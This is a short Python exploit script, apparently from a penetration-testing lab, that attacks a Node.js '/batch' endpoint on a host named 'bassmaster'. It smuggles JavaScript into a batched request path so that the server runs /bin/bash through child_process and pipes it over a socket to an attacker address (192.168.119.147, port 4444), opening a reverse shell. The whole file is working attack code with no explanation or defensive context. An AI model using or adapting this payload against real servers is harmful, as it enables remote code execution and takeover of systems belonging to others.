import requests,sys

target = "http://bassmaster:8080/batch"
cmd = "\\\\x2fbin\\\\x2fbash"
attackerip = '192.168.119.147'
attackerport = '4444'
request_1 = '{"method":"get","path":"/profile"}'
request_2 = '{"method":"get","path":"/item"}'
shell = 'var net = require(\'net\'),sh = require(\'child_process\').exec(\'%s\'); ' % cmd
shell += 'var client = new net.Socket(); '
shell += 'client.connect(%s, \'%s\', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);' % (attackerport, attackerip)
shell += 'sh.stderr.pipe(client);});'
request_3 = '{"method":"get","path":"/item/$1.id;%s"}' % shell
print (request_3)
json = '{"requests":[%s,%s,%s]}' % (request_1, request_2, request_3)
r = requests.post(target, json)
print (r.content)